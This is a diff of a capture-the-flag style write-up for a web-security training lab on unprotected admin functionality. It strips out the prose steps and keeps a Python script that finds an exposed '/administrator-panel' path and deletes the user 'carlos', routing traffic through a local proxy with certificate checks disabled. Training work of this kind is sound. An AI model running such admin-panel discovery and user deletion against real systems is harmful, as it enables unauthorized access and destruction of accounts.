@@ -1,22 +1,11 @@
-                                                  Lab: Unprotected admin functionality
-
-GOAL :- Access the unpreiveleged account of administrator and delete the user carlos..
-
-step 1) first we will see by moving to different path how the application behaves
-step 2) after entering  /admin 
-          https://0ace0020046be2c382e4cee600fc005b.web-security-academy.net/admin 
-          we can see application say not-found
-step 3) hence we only need to enumerate certain accounts and see whether the app is accepting it or not
-step 4) after entering end point /administrator-panel we can see that we successfully get into administrator account
-step 5) after deleting user carlos we solved the lab..
-
-PAYLOAD ::-- (python script) ::::----
-
 import requests
 import sys
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
+
+
 def delete_user(url):
     admin_panel_url = url +'/administrator-panel'
     r = requests.get(admin_panel_url,verify=False,proxies=proxies)
@@ -32,6 +21,10 @@ def delete_user(url):
     else:
         print("[-] Administrator panel not found.... ")
         print("[-] Exiting the script ")
+
+
+
+
 def main():
     if len(sys.argv) != 2:
         print("[+] usage : %s <url> " % sys.argv[0])
@@ -41,7 +34,7 @@ def main():
     url = sys.argv[1]
     print("[+] finding admin panel.... ")
     delete_user(url)
+
+
 if __name__ == "__main__":
     main()
-
-
